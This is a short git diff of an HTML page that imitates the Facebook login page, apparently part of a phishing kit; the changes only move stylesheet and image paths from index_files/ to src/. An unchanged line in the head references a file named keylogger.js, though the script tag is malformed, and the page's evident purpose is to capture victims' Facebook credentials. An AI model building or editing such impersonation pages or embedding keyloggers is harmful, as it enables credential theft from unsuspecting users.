@@ -5,8 +5,8 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook – log in or sign up</title>
-    <link rel="stylesheet" href="index_files/default.css">
-    <link rel="stylesheet" href="index_files/style.css">
+    <link rel="stylesheet" href="src/default.css">
+    <link rel="stylesheet" href="src/style.css">
     <script> src="index_files/keylogger.js"</script>
 </head>
 <body>
@@ -16,7 +16,7 @@
                 <div class="col-7">
                     <div class="align-center">
                         <div class="content">
-                            <img src="index_files/img/fb.png" alt="">
+                            <img src="src/img/fb.png" alt="">
                             <p>Facebook helps you connect and share with the people in your life.</p>
                         </div>
                     </div>
